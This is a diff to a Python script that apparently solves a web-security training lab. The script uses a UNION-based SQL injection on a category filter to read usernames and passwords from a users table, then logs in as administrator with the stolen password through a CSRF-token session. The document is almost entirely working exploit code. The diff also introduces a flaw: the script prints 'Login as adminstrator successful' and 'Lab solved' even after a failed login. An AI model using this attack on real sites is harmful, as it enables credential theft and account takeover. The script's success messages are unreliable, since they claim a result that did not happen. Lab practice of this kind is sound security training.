@@ -5,6 +5,7 @@
 from bs4 import BeautifulSoup
 import requests
 import sys
+import time
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -12,7 +13,7 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 
 def find_admin_credentials(host):
-    url = f'{host}/filter?category={category}'
+    url = f'{host}/filter?category=X'
     payload = f"' UNION (SELECT username, password FROM users)--"
     r = requests.get(f"{url}{payload}", verify=False, proxies=proxies)
     res = r.text
@@ -30,31 +31,35 @@ def login(host, password):
         soup = BeautifulSoup(r.text, 'html.parser')
         return soup.find('input', attrs={'name': 'csrf'})['value']
 
-    client = requests.Session()
-    client.proxies = proxies
-    client.verify = False
+    with requests.Session() as client:
+        client.proxies = proxies
+        client.verify = False
 
-    url = f'{host}/Login'
-    csrf = get_csrf_token(client, url)
-    if len(csrf) > 0:
-        print(f'[+] Found CSRF token')
-    else:
-        print(f'[-] No CSRF token found')
+        url = f'{host}/Login'
+        csrf = get_csrf_token(client, url)
+        if len(csrf) > 0:
+            print(f'[+] Found CSRF token: {csrf}')
+        else:
+            print(f'[-] No CSRF token found')
 
-    payload = {'csrf': csrf,
-               'username': 'administrator',
-               'password': password}
-    r = client.post(url, data=payload, allow_redirects=True)
-    return 'Congratulations, you solved the lab!' in r.text
+        payload = {'csrf': csrf,
+                   'username': 'administrator',
+                   'password': password}
+        client.post(url, data=payload, allow_redirects=True)
+
+        # I had some issues getting the 'congratulations' banner.
+        # So wait a bit before getting the page
+        time.sleep(2)
+        return 'Congratulations, you solved the lab!' in requests.get(f'{host}').text
 
 
 if __name__ == "__main__":
+    print('[+] SQL injection UNION attack, retrieving data from other tables')
     try:
         host = sys.argv[1].strip().rstrip('/')
-        category = sys.argv[2].strip()
     except IndexError:
-        print(f'[-] Usage: {sys.argv[0]} <host> <category>')
-        print(f'[-] Example: {sys.argv[0]} http://www.example.com Lifestyle')
+        print(f'[-] Usage: {sys.argv[0]} <host>')
+        print(f'[-] Example: {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
     credentials = find_admin_credentials(host)
@@ -64,7 +69,8 @@ if __name__ == "__main__":
     print(f'[+] Admin password is {credentials}')
 
     print(f'[ ] Attempting login')
-    if login(host, credentials):
-        print(f'[+] Login as adminstrator successful')
-    else:
+    if not login(host, credentials):
         print(f'[-] Login as adminstrator not successful')
+
+    print(f'[+] Login as adminstrator successful')
+    print(f'[+] Lab solved')
